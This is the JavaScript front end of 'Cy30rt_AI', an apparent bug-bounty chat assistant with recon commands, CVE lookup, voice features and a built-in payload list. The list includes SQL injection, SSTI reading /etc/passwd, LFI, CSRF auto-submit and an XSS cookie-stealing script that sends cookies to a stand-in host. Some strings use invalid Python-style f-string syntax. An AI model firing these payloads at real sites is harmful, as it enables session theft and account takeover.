// Cy30rt_AI - Complete Version with Cancel/Stop/Terminate
// Created by Abdulbasid Yakubu (cy30rt)

const API_URL = "https://cy30rt-ai.onrender.com";

// Global variables
let currentLanguage = "en";
let audioInitialized = false;
let chatHistory = [];
let currentChatId = null;
let recordingStatusDiv = null;

// Cancel/Stop functionality
let currentAbortController = null;
let isOperationRunning = false;
let currentOperationType = null;

// Voice settings
let voiceSpeed = 1.0;
let voicePitch = 1.0;
let autoPlayEnabled = false;
let voiceReadbackEnabled = false;

// Voice map
const voiceMap = {
    'en': 'en-US', 'ar': 'ar-SA', 'es': 'es-ES',
    'fr': 'fr-FR', 'de': 'de-DE', 'hi': 'hi-IN',
    'ha': 'en-US', 'pt': 'pt-BR', 'ru': 'ru-RU',
    'zh': 'zh-CN', 'ja': 'ja-JP', 'ko': 'ko-KR',
    'tr': 'tr-TR', 'fa': 'fa-IR', 'ur': 'ur-PK'
};

// ============ CANCEL FUNCTIONS ============
function cancelCurrentOperation() {
    if (currentAbortController) {
        currentAbortController.abort();
        currentAbortController = null;
        isOperationRunning = false;
        hideTypingIndicator();
        addSystemMessage("⏹️ **Operation cancelled.** The running scan/command has been terminated.");
        return true;
    } else {
        addSystemMessage("ℹ️ No operation is currently running.");
        return false;
    }
}

function stopAllOperations() {
    if (currentAbortController) {
        currentAbortController.abort();
        currentAbortController = null;
    }
    isOperationRunning = false;
    hideTypingIndicator();
    addSystemMessage("🛑 **All operations stopped.** Ready for new commands.");
}

// ============ CHAT HISTORY ============
function initChatHistory() {
    const saved = localStorage.getItem("cy30rt_chats");
    if (saved) {
        try {
            chatHistory = JSON.parse(saved);
        } catch(e) { chatHistory = []; }
    }
    
    if (chatHistory.length === 0) {
        createNewChat();
    } else {
        currentChatId = chatHistory[0].id;
        loadCurrentChat();
    }
    renderHistoryList();
}

function saveChats() {
    localStorage.setItem("cy30rt_chats", JSON.stringify(chatHistory));
}

function createNewChat() {
    if (isOperationRunning) {
        cancelCurrentOperation();
    }
    const newId = Date.now().toString();
    const newChat = {
        id: newId,
        title: "New Chat",
        messages: [],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString()
    };
    chatHistory.unshift(newChat);
    currentChatId = newId;
    saveChats();
    renderHistoryList();
    loadCurrentChat();
}

function switchChat(chatId) {
    if (isOperationRunning) {
        if (confirm("A scan is currently running. Switch anyway? Current operation will be cancelled.")) {
            cancelCurrentOperation();
        } else {
            return;
        }
    }
    currentChatId = chatId;
    loadCurrentChat();
    renderHistoryList();
}

function loadCurrentChat() {
    const chat = chatHistory.find(c => c.id === currentChatId);
    const container = document.getElementById("messagesContainer");
    
    if (!chat || chat.messages.length === 0) {
        container.innerHTML = getWelcomeHTML();
        return;
    }
    
    container.innerHTML = '';
    chat.messages.forEach(msg => {
        if (msg.role === 'user') {
            addMessageToUI('user', msg.content, msg.timestamp);
        } else if (msg.role === 'assistant') {
            addMessageToUI('assistant', msg.content, msg.timestamp);
        }
    });
    scrollToBottom();
}

function renderHistoryList() {
    const historyList = document.getElementById("historyList");
    if (!historyList) return;
    
    if (chatHistory.length === 0) {
        historyList.innerHTML = '<div style="padding: 12px; text-align: center; color: #666;">No chats yet</div>';
        return;
    }
    
    historyList.innerHTML = chatHistory.map(chat => `
        <div class="history-item ${currentChatId === chat.id ? 'active' : ''}" onclick="switchChat('${chat.id}')">
            ${escapeHtml(chat.title.substring(0, 30))}
        </div>
    `).join('');
}

function addMessageToCurrentChat(role, content) {
    const chat = chatHistory.find(c => c.id === currentChatId);
    if (!chat) return;
    
    chat.messages.push({
        role: role,
        content: content,
        timestamp: new Date().toISOString()
    });
    chat.updatedAt = new Date().toISOString();
    
    if (role === 'user' && chat.messages.length === 1) {
        chat.title = content.substring(0, 30) + (content.length > 30 ? '...' : '');
    }
    
    saveChats();
    renderHistoryList();
}

function getWelcomeHTML() {
    return `
        <div class="welcome-screen">
            <div class="welcome-icon">🤖</div>
            <h1>Cy30rt_AI</h1>
            <p>Your cybersecurity & bug bounty assistant</p>
            <div class="example-prompts">
                <button class="example-btn" onclick="sendExample('/recon scanme.nmap.org')">Fast Recon</button>
                <button class="example-btn" onclick="sendExample('/fullrecon scanme.nmap.org')">Full Recon</button>
                <button class="example-btn" onclick="sendExample('/payload sqli')">Get Payloads</button>
                <button class="example-btn" onclick="sendExample('/cve CVE-2024-6387')">Look up CVE</button>
            </div>
            <div class="creator-note">
                Created by Abdulbasid Yakubu (cy30rt) | Type /help for commands | Type /cancel to stop running scans
            </div>
        </div>
    `;
}

function addMessageToUI(role, content, timestamp = null) {
    const container = document.getElementById("messagesContainer");
    const timeStr = timestamp ? new Date(timestamp).toLocaleTimeString() : new Date().toLocaleTimeString();
    const messageDiv = document.createElement("div");
    messageDiv.className = `message ${role}`;
    messageDiv.innerHTML = `
        <div class="message-avatar">${role === 'user' ? 'U' : 'AI'}</div>
        <div class="message-content">
            <div class="message-header">
                <span class="message-sender">${role === 'user' ? 'You' : 'Cy30rt_AI'}</span>
                <span class="message-time">${timeStr}</span>
            </div>
            <div class="message-text">${formatMessage(escapeHtml(content))}</div>
        </div>
    `;
    container.appendChild(messageDiv);
    scrollToBottom();
}

function addSystemMessage(text) {
    const container = document.getElementById("messagesContainer");
    const sysDiv = document.createElement("div");
    sysDiv.className = "message system";
    sysDiv.innerHTML = `
        <div class="message-avatar">ℹ️</div>
        <div class="message-content">
            <div class="message-text" style="background: rgba(59,130,246,0.1); text-align: center; font-size: 0.85rem;">
                ${escapeHtml(text)}
            </div>
        </div>
    `;
    container.appendChild(sysDiv);
    scrollToBottom();
}

function formatMessage(text) {
    text = text.replace(/```(\w*)\n([\s\S]*?)```/g, '<pre><code>$2</code></pre>');
    text = text.replace(/`([^`]+)`/g, '<code>$1</code>');
    text = text.replace(/\n/g, '<br>');
    return text;
}

// ============ TYPING ANIMATION ============
async function typeMessage(element, text) {
    element.innerHTML = '';
    const chars = text.split('');
    for (let i = 0; i < chars.length; i++) {
        if (!isOperationRunning && currentOperationType !== 'typing') {
            element.innerHTML += chars.slice(i).join('');
            break;
        }
        element.innerHTML += chars[i];
        await sleep(10);
        scrollToBottom();
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ============ API CALL WITH CANCEL SUPPORT ============
async function apiCall(endpoint, options) {
    if (currentAbortController) {
        currentAbortController.abort();
    }
    
    currentAbortController = new AbortController();
    isOperationRunning = true;
    
    try {
        const response = await fetch(`${API_URL}${endpoint}`, {
            ...options,
            signal: currentAbortController.signal
        });
        isOperationRunning = false;
        currentAbortController = null;
        return response;
    } catch (error) {
        isOperationRunning = false;
        currentAbortController = null;
        if (error.name === 'AbortError') {
            throw new Error('CANCELLED');
        }
        throw error;
    }
}

// ============ SEND MESSAGE ============
async function sendMessage() {
    const input = document.getElementById("messageInput");
    let message = input.value.trim();
    if (!message) return;
    
    input.value = "";
    input.style.height = "auto";
    
    const container = document.getElementById("messagesContainer");
    if (container.querySelector(".welcome-screen")) {
        container.innerHTML = '';
    }
    
    addMessageToUI('user', message);
    addMessageToCurrentChat('user', message);
    
    // Check for cancellation commands first
    const cancelCommands = ["/cancel", "/stop", "/terminate", "/kill"];
    if (cancelCommands.includes(message.toLowerCase())) {
        cancelCurrentOperation();
        return;
    }
    
    showTypingIndicator();
    currentOperationType = 'api';
    
    try {
        // Check for recon commands
        let isReconCommand = false;
        let target = null;
        let options = {};
        
        if (message.startsWith('/fullrecon')) {
            target = message.replace('/fullrecon', '').trim();
            if (target) {
                isReconCommand = true;
                addSystemMessage(f"🔍 Starting FULL reconnaissance on {target}...\nType /cancel to stop.");
                const response = await apiCall('/api/recon', {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ target: target, options: { deep: true, js: true, historical: true, aggressive: true } })
                });
                const data = await response.json();
                hideTypingIndicator();
                if (data.success) {
                    let resultText = formatReconResults(data);
                    const messageDiv = document.createElement("div");
                    messageDiv.className = "message assistant";
                    messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
                    container.appendChild(messageDiv);
                    const textDiv = messageDiv.querySelector(".message-text");
                    await typeMessage(textDiv, resultText);
                    addMessageToCurrentChat('assistant', resultText);
                    if (autoPlayEnabled) textToSpeech(resultText, currentLanguage);
                    addAudioControls(messageDiv, resultText, currentLanguage);
                } else {
                    addErrorMessage(data.error || "Scan failed");
                }
                currentOperationType = null;
                return;
            }
        }
        
        if (message.startsWith('/recon')) {
            target = message.replace('/recon', '').trim();
            if (target) {
                isReconCommand = true;
                addSystemMessage(f"🔍 Starting reconnaissance on {target}...\nType /cancel to stop.");
                const response = await apiCall('/api/recon', {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ target: target, options: { deep: true, threads: 10 } })
                });
                const data = await response.json();
                hideTypingIndicator();
                if (data.success) {
                    let resultText = formatReconResults(data);
                    const messageDiv = document.createElement("div");
                    messageDiv.className = "message assistant";
                    messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
                    container.appendChild(messageDiv);
                    const textDiv = messageDiv.querySelector(".message-text");
                    await typeMessage(textDiv, resultText);
                    addMessageToCurrentChat('assistant', resultText);
                    if (autoPlayEnabled) textToSpeech(resultText, currentLanguage);
                    addAudioControls(messageDiv, resultText, currentLanguage);
                } else {
                    addErrorMessage(data.error || "Scan failed");
                }
                currentOperationType = null;
                return;
            }
        }
        
        // Handle payload commands
        if (message.startsWith('/payload')) {
            const type = message.replace('/payload', '').trim().toLowerCase();
            const payloads = getPayloads(type);
            hideTypingIndicator();
            const messageDiv = document.createElement("div");
            messageDiv.className = "message assistant";
            messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
            container.appendChild(messageDiv);
            const textDiv = messageDiv.querySelector(".message-text");
            await typeMessage(textDiv, payloads);
            addMessageToCurrentChat('assistant', payloads);
            if (autoPlayEnabled) textToSpeech(payloads, currentLanguage);
            addAudioControls(messageDiv, payloads, currentLanguage);
            return;
        }
        
        // Handle CVE commands
        if (message.startsWith('/cve')) {
            const cveId = message.replace('/cve', '').trim().toUpperCase();
            if (cveId) {
                const finalCve = cveId.startsWith('CVE-') ? cveId : `CVE-${cveId}`;
                addSystemMessage(f"🔍 Looking up {finalCve}...");
                const response = await apiCall(`/api/cve/${finalCve}`, { method: "GET" });
                const data = await response.json();
                hideTypingIndicator();
                const resultText = formatCVEResult(data, finalCve);
                const messageDiv = document.createElement("div");
                messageDiv.className = "message assistant";
                messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
                container.appendChild(messageDiv);
                const textDiv = messageDiv.querySelector(".message-text");
                await typeMessage(textDiv, resultText);
                addMessageToCurrentChat('assistant', resultText);
                if (autoPlayEnabled) textToSpeech(resultText, currentLanguage);
                addAudioControls(messageDiv, resultText, currentLanguage);
                return;
            }
        }
        
        // Handle help command
        if (message === '/help' || message === '/commands') {
            const helpText = getHelpText();
            hideTypingIndicator();
            const messageDiv = document.createElement("div");
            messageDiv.className = "message assistant";
            messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
            container.appendChild(messageDiv);
            const textDiv = messageDiv.querySelector(".message-text");
            await typeMessage(textDiv, helpText);
            addMessageToCurrentChat('assistant', helpText);
            if (autoPlayEnabled) textToSpeech(helpText, currentLanguage);
            addAudioControls(messageDiv, helpText, currentLanguage);
            return;
        }
        
        // Handle who command
        if (message === '/who' || message === '/creator' || message === '/about') {
            const whoText = getWhoText();
            hideTypingIndicator();
            const messageDiv = document.createElement("div");
            messageDiv.className = "message assistant";
            messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
            container.appendChild(messageDiv);
            const textDiv = messageDiv.querySelector(".message-text");
            await typeMessage(textDiv, whoText);
            addMessageToCurrentChat('assistant', whoText);
            if (autoPlayEnabled) textToSpeech(whoText, currentLanguage);
            addAudioControls(messageDiv, whoText, currentLanguage);
            return;
        }
        
        // Handle learn command
        if (message.startsWith('/learn')) {
            const topic = message.replace('/learn', '').trim().toLowerCase();
            const lessonText = getLessonText(topic);
            hideTypingIndicator();
            const messageDiv = document.createElement("div");
            messageDiv.className = "message assistant";
            messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
            container.appendChild(messageDiv);
            const textDiv = messageDiv.querySelector(".message-text");
            await typeMessage(textDiv, lessonText);
            addMessageToCurrentChat('assistant', lessonText);
            if (autoPlayEnabled) textToSpeech(lessonText, currentLanguage);
            addAudioControls(messageDiv, lessonText, currentLanguage);
            return;
        }
        
        // Handle new chat command
        if (message === '/new' || message === '/clear') {
            createNewChat();
            hideTypingIndicator();
            addSystemMessage("✨ New conversation started! Previous chat saved in sidebar.");
            return;
        }
        
        // Default: Use Groq API
        const response = await apiCall('/api/chat', {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ message: message, language: currentLanguage })
        });
        
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        
        const data = await response.text();
        hideTypingIndicator();
        
        const messageDiv = document.createElement("div");
        messageDiv.className = "message assistant";
        messageDiv.innerHTML = `
            <div class="message-avatar">AI</div>
            <div class="message-content">
                <div class="message-header">
                    <span class="message-sender">Cy30rt_AI</span>
                    <span class="message-time">${new Date().toLocaleTimeString()}</span>
                </div>
                <div class="message-text" id="streamingText"></div>
            </div>
        `;
        container.appendChild(messageDiv);
        
        const textDiv = messageDiv.querySelector(".message-text");
        await typeMessage(textDiv, data);
        
        addMessageToCurrentChat('assistant', data);
        
        if (autoPlayEnabled) {
            textToSpeech(data, currentLanguage);
        }
        
        addAudioControls(messageDiv, data, currentLanguage);
        
    } catch (error) {
        hideTypingIndicator();
        currentOperationType = null;
        if (error.message === 'CANCELLED') {
            addSystemMessage("⏹️ Operation cancelled by user.");
        } else {
            console.error(error);
            addErrorMessage(error.message);
        }
    }
}

function formatReconResults(data) {
    let results = `✅ **Recon Complete - ${data.target}**\n\n`;
    results += `📊 **Summary**\n`;
    results += `• Subdomains found: ${data.summary?.subdomains_found || 0}\n`;
    results += `• Technologies detected: ${data.summary?.technologies_found || 0}\n`;
    results += `• Endpoints discovered: ${data.summary?.endpoints_found || 0}\n`;
    results += `• Secrets found: ${data.summary?.secrets_found || 0}\n\n`;
    
    if (data.findings?.subdomains?.length > 0) {
        results += `🔹 **Subdomains Found:**\n`;
        data.findings.subdomains.slice(0, 15).forEach(s => results += `  • ${s}\n`);
        results += `\n`;
    }
    
    if (data.findings?.technologies?.length > 0) {
        results += `🔹 **Technologies:**\n`;
        data.findings.technologies.slice(0, 10).forEach(t => results += `  • ${t}\n`);
        results += `\n`;
    }
    
    results += `💡 **Next Steps:**\n`;
    results += `• /payload sqli - Get SQL injection payloads\n`;
    results += `• /cve CVE-2024-6387 - Look up vulnerabilities\n`;
    results += `• /learn sqli - Learn exploitation techniques\n\n`;
    results += `⚠️ Type /cancel to stop any running scan.\n\nStay secure. - Cy30rt_AI`;
    
    return results;
}

function getPayloads(type) {
    const payloads = {
        "sqli": `💉 **SQL Injection Payloads**\n\n**Authentication Bypass:**\n' OR '1'='1' --\nadmin' --\n' OR 1=1--\n\n**Union-Based:**\n' UNION SELECT null, username, password FROM users--\n' UNION SELECT 1,2,3,4,5--\n\n**Time-Based:**\n' AND SLEEP(5)--\n' OR IF(1=1, SLEEP(5), 0)--`,
        "xss": `🔓 **XSS Payloads**\n\n**Basic Alert:**\n<script>alert('XSS')</script>\n<img src=x onerror=alert(1)>\n<svg/onload=alert(1)>\n\n**Cookie Stealing:**\n<script>fetch('https://your-server.com/steal?c='+document.cookie)</script>`,
        "ssti": `🧠 **SSTI Payloads**\n\n**Jinja2 (Python):**\n{{7*7}}\n{{config}}\n{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`,
        "lfi": `📂 **LFI/RFI Payloads**\n\n**Basic LFI:**\n../../../../etc/passwd\n../../../etc/passwd%00\nphp://filter/convert.base64-encode/resource=index.php`,
        "csrf": `🔄 **CSRF Payloads**\n\n<img src="https://target.com/change-email?email=hacker@evil.com">\n\n<form action="https://target.com/change-password" method="POST">\n  <input type="hidden" name="password" value="hacked123">\n</form>\n<script>document.forms[0].submit();</script>`
    };
    return payloads[type] || `📋 Available: sqli, xss, ssti, lfi, csrf\n\nExample: /payload sqli`;
}

function formatCVEResult(data, cveId) {
    if (!data || data.error) {
        return `🔍 **${cveId}**\n\n❌ CVE not found or error occurred.\n\nCheck the ID format (e.g., CVE-2024-6387)`;
    }
    return `🔍 **${cveId}**\n\n**Summary:** ${data.summary || 'No summary available'}\n\n**CVSS Score:** ${data.cvss || 'N/A'}\n\n**Published:** ${data.published || 'N/A'}\n\n⚠️ Always verify with official NVD database.`;
}

function getHelpText() {
    return `🤖 **Cy30rt_AI Commands**\n\n🔍 **RECONNAISSANCE:**\n/recon <target> - Fast recon\n/fullrecon <target> - Complete workflow\n\n💉 **PAYLOADS:**\n/payload sqli - SQL injection\n/payload xss - XSS\n/payload ssti - SSTI\n/payload lfi - LFI/RFI\n/payload csrf - CSRF\n\n📋 **INTELLIGENCE:**\n/cve <id> - Look up CVE\n\n📚 **LEARNING:**\n/learn sqli - SQL lesson\n/learn xss - XSS lesson\n\n🛑 **CONTROL:**\n/cancel - Stop current operation\n/stop - Same as cancel\n/terminate - Same as cancel\n/new - Start new chat\n\n💬 **GENERAL:**\n/help - Show this\n/who - About creator\n\n⚠️ Type /cancel to stop any running scan!`;
}

function getWhoText() {
    return `🤖 **Cy30rt_AI**\n\nCreated by **Abdulbasid Yakubu (cy30rt)** - Cybersecurity Professional\n\n**Features:**\n• Real reconnaissance tools (Reconix)\n• Payload generation (SQLi, XSS, SSTI, LFI, CSRF)\n• CVE lookup\n• Voice input with adjustable speed/pitch\n• 15 languages support\n• Chat history\n• /cancel to stop any operation\n\n⚠️ Always test on authorized targets only!`;
}

function getLessonText(topic) {
    const lessons = {
        "sqli": `📚 **SQL Injection Lesson**\n\n**What is SQL Injection?**\nSQL injection occurs when user input is inserted directly into SQL queries without sanitization.\n\n**How it works:**\nNormal: SELECT * FROM users WHERE username='admin'\nMalicious: admin' --\nResult: SELECT * FROM users WHERE username='admin' --\n\n**Test payloads:** /payload sqli`,
        "xss": `📚 **XSS Lesson**\n\n**What is XSS?**\nInjecting malicious JavaScript into web pages.\n\n**Types:** Reflected, Stored, DOM-based\n\n**Test payloads:** /payload xss`
    };
    return lessons[topic] || `📚 Topic '${topic}' not found.\n\nAvailable: sqli, xss\n\nExample: /learn sqli`;
}

function sendExample(prompt) {
    document.getElementById("messageInput").value = prompt;
    sendMessage();
}

function addErrorMessage(error) {
    const container = document.getElementById("messagesContainer");
    const errorDiv = document.createElement("div");
    errorDiv.className = "message assistant";
    errorDiv.innerHTML = `
        <div class="message-avatar">!</div>
        <div class="message-content">
            <div class="message-header">
                <span class="message-sender">Error</span>
                <span class="message-time">${new Date().toLocaleTimeString()}</span>
            </div>
            <div class="message-text" style="color: #ef4444;">Error: ${escapeHtml(error)}</div>
        </div>
    `;
    container.appendChild(errorDiv);
    scrollToBottom();
}

function addAudioControls(messageDiv, text, language) {
    const existing = messageDiv.querySelector(".audio-controls");
    if (existing) existing.remove();
    
    const controlsDiv = document.createElement("div");
    controlsDiv.className = "audio-controls";
    
    const playBtn = document.createElement("button");
    playBtn.className = "audio-btn";
    playBtn.textContent = "Play Audio";
    
    const stopBtn = document.createElement("button");
    stopBtn.className = "audio-btn";
    stopBtn.textContent = "Stop";
    
    let isPlaying = false;
    
    playBtn.onclick = async () => {
        if (isPlaying) {
            window.speechSynthesis.cancel();
            playBtn.textContent = "Play Audio";
            isPlaying = false;
            return;
        }
        playBtn.textContent = "Playing...";
        isPlaying = true;
        await textToSpeech(text, language);
        playBtn.textContent = "Play Audio";
        isPlaying = false;
    };
    
    stopBtn.onclick = () => {
        window.speechSynthesis.cancel();
        playBtn.textContent = "Play Audio";
        isPlaying = false;
    };
    
    controlsDiv.appendChild(playBtn);
    controlsDiv.appendChild(stopBtn);
    messageDiv.querySelector(".message-content").appendChild(controlsDiv);
}

// ============ AUDIO FUNCTIONS ============
function initAudio() {
    if (audioInitialized) return;
    try {
        const silent = new SpeechSynthesisUtterance("");
        silent.volume = 0;
        window.speechSynthesis.speak(silent);
        audioInitialized = true;
    } catch(e) {}
}

async function textToSpeech(text, languageCode) {
    return new Promise((resolve) => {
        if (!window.speechSynthesis) { resolve(false); return; }
        initAudio();
        window.speechSynthesis.cancel();
        const cleanText = text.replace(/[\[\]\(\)\*\_\#]/g, '').substring(0, 1500);
        const utterance = new SpeechSynthesisUtterance(cleanText);
        utterance.lang = voiceMap[languageCode] || 'en-US';
        utterance.rate = voiceSpeed;
        utterance.pitch = voicePitch;
        utterance.onend = () => resolve(true);
        utterance.onerror = () => resolve(false);
        window.speechSynthesis.speak(utterance);
    });
}

// ============ VOICE INPUT ============
function setupVoiceInput() {
    const voiceBtn = document.getElementById("voiceBtn");
    if (!voiceBtn) return;
    
    const SpeechRecognition = window.webkitSpeechRecognition || window.SpeechRecognition;
    if (!SpeechRecognition) { voiceBtn.style.opacity = "0.5"; return; }
    
    const recognition = new SpeechRecognition();
    recognition.continuous = false;
    recognition.interimResults = false;
    
    voiceBtn.onclick = () => {
        initAudio();
        recognition.lang = currentLanguage === "ar" ? "ar-SA" : "en-US";
        recognition.start();
        voiceBtn.classList.add("recording");
        showRecordingStatus();
    };
    
    recognition.onresult = (event) => {
        const text = event.results[0][0].transcript;
        document.getElementById("messageInput").value = text;
        sendMessage();
        voiceBtn.classList.remove("recording");
        hideRecordingStatus();
    };
    
    recognition.onerror = () => { voiceBtn.classList.remove("recording"); hideRecordingStatus(); };
    recognition.onend = () => { voiceBtn.classList.remove("recording"); hideRecordingStatus(); };
}

function showRecordingStatus() {
    if (recordingStatusDiv) recordingStatusDiv.remove();
    recordingStatusDiv = document.createElement("div");
    recordingStatusDiv.className = "recording-status";
    recordingStatusDiv.innerHTML = 'Recording... Speak now';
    document.body.appendChild(recordingStatusDiv);
    setTimeout(() => { if (recordingStatusDiv) recordingStatusDiv.remove(); }, 10000);
}

function hideRecordingStatus() {
    if (recordingStatusDiv) { recordingStatusDiv.remove(); recordingStatusDiv = null; }
}

// ============ HELPER FUNCTIONS ============
function showTypingIndicator() {
    const indicator = document.getElementById("typingIndicator");
    if (indicator) indicator.style.display = "flex";
    scrollToBottom();
}

function hideTypingIndicator() {
    const indicator = document.getElementById("typingIndicator");
    if (indicator) indicator.style.display = "none";
}

function scrollToBottom() {
    const chatArea = document.getElementById("chatArea");
    if (chatArea) chatArea.scrollTop = chatArea.scrollHeight;
}

function escapeHtml(text) {
    const div = document.createElement("div");
    div.textContent = text;
    return div.innerHTML;
}

// ============ SETTINGS ============
function loadSettings() {
    autoPlayEnabled = localStorage.getItem("auto_play") === "true";
    voiceReadbackEnabled = localStorage.getItem("voice_readback") === "true";
    voiceSpeed = parseFloat(localStorage.getItem("voice_speed") || "1.0");
    voicePitch = parseFloat(localStorage.getItem("voice_pitch") || "1.0");
    
    const autoToggle = document.getElementById("autoPlayToggle");
    const readbackToggle = document.getElementById("voiceReadbackToggle");
    const speedSlider = document.getElementById("voiceSpeed");
    const pitchSlider = document.getElementById("voicePitch");
    const speedVal = document.getElementById("speedValue");
    const pitchVal = document.getElementById("pitchValue");
    
    if (autoToggle) autoToggle.checked = autoPlayEnabled;
    if (readbackToggle) readbackToggle.checked = voiceReadbackEnabled;
    if (speedSlider) speedSlider.value = voiceSpeed;
    if (pitchSlider) pitchSlider.value = voicePitch;
    if (speedVal) speedVal.textContent = voiceSpeed === 1.0 ? "Normal" : `${voiceSpeed.toFixed(1)}x`;
    if (pitchVal) pitchVal.textContent = voicePitch === 1.0 ? "Normal" : `${voicePitch.toFixed(1)}x`;
}

function saveSettings() {
    autoPlayEnabled = document.getElementById("autoPlayToggle")?.checked || false;
    voiceReadbackEnabled = document.getElementById("voiceReadbackToggle")?.checked || false;
    voiceSpeed = parseFloat(document.getElementById("voiceSpeed")?.value || "1.0");
    voicePitch = parseFloat(document.getElementById("voicePitch")?.value || "1.0");
    
    localStorage.setItem("auto_play", autoPlayEnabled);
    localStorage.setItem("voice_readback", voiceReadbackEnabled);
    localStorage.setItem("voice_speed", voiceSpeed);
    localStorage.setItem("voice_pitch", voicePitch);
    
    const speedVal = document.getElementById("speedValue");
    const pitchVal = document.getElementById("pitchValue");
    if (speedVal) speedVal.textContent = voiceSpeed === 1.0 ? "Normal" : `${voiceSpeed.toFixed(1)}x`;
    if (pitchVal) pitchVal.textContent = voicePitch === 1.0 ? "Normal" : `${voicePitch.toFixed(1)}x`;
}

function showSettingsModal() { document.getElementById("settingsModal").classList.add("active"); }
function closeSettingsModal() { document.getElementById("settingsModal").classList.remove("active"); }
function showLanguageModal() { document.getElementById("languageModal").classList.add("active"); }
function closeLanguageModal() { document.getElementById("languageModal").classList.remove("active"); }

function changeLanguage(langCode) {
    currentLanguage = langCode;
    localStorage.setItem("cy30rt_language", langCode);
    closeLanguageModal();
}

function renderLanguageGrid() {
    const grid = document.getElementById("languageModalGrid");
    if (!grid || typeof LANGUAGES === 'undefined') return;
    grid.innerHTML = "";
    grid.className = "language-grid";
    Object.entries(LANGUAGES).forEach(([code, lang]) => {
        const btn = document.createElement("div");
        btn.className = "language-item";
        btn.onclick = () => changeLanguage(code);
        btn.innerHTML = `
            <div class="language-flag">${lang.flag}</div>
            <div class="language-name">${lang.name}</div>
            <div class="language-native">${lang.native}</div>
        `;
        grid.appendChild(btn);
    });
}

// ============ MOBILE MENU ============
function toggleMobileMenu() {
    document.getElementById("sidebar").classList.toggle("open");
}

// ============ EXPORT FUNCTIONS FOR GLOBAL ACCESS ============
window.cancelCurrentOperation = cancelCurrentOperation;
window.stopAllOperations = stopAllOperations;
window.switchChat = switchChat;
window.sendExample = sendExample;

// ============ INITIALIZE ============
document.addEventListener("DOMContentLoaded", () => {
    console.log("Cy30rt_AI Ready - Cancel/Stop Commands Active");
    
    initChatHistory();
    loadSettings();
    renderLanguageGrid();
    
    document.getElementById("sendBtn")?.addEventListener("click", sendMessage);
    document.getElementById("settingsBtn")?.addEventListener("click", showSettingsModal);
    document.getElementById("languageBtn")?.addEventListener("click", showLanguageModal);
    document.getElementById("mobileMenuBtn")?.addEventListener("click", toggleMobileMenu);
    
    document.getElementById("messageInput")?.addEventListener("keypress", (e) => {
        if (e.key === "Enter" && !e.shiftKey) {
            e.preventDefault();
            sendMessage();
        }
    });
    
    document.getElementById("messageInput")?.addEventListener("input", function(e) {
        e.target.style.height = "auto";
        e.target.style.height = Math.min(e.target.scrollHeight, 120) + "px";
    });
    
    document.querySelector(".modal-close")?.addEventListener("click", closeLanguageModal);
    document.querySelector(".modal-close-settings")?.addEventListener("click", closeSettingsModal);
    
    document.getElementById("autoPlayToggle")?.addEventListener("change", saveSettings);
    document.getElementById("voiceReadbackToggle")?.addEventListener("change", saveSettings);
    document.getElementById("voiceSpeed")?.addEventListener("input", saveSettings);
    document.getElementById("voicePitch")?.addEventListener("input", saveSettings);
    
    setupVoiceInput();
    
    window.onclick = (event) => {
        if (event.target === document.getElementById("languageModal")) closeLanguageModal();
        if (event.target === document.getElementById("settingsModal")) closeSettingsModal();
    };
    
    if (document.getElementById("sidebar")) {
        document.addEventListener("click", function(e) {
            const sidebar = document.getElementById("sidebar");
            const menuBtn = document.getElementById("mobileMenuBtn");
            if (sidebar && sidebar.classList.contains("open") && !sidebar.contains(e.target) && e.target !== menuBtn) {
                sidebar.classList.remove("open");
            }
        });
    }
    
    const savedLang = localStorage.getItem("cy30rt_language");
    if (savedLang && typeof LANGUAGES !== 'undefined' && LANGUAGES[savedLang]) {
        currentLanguage = savedLang;
    }
    
    // Add cancel command info to console
    console.log("Type /cancel, /stop, or /terminate to cancel running operations");
});
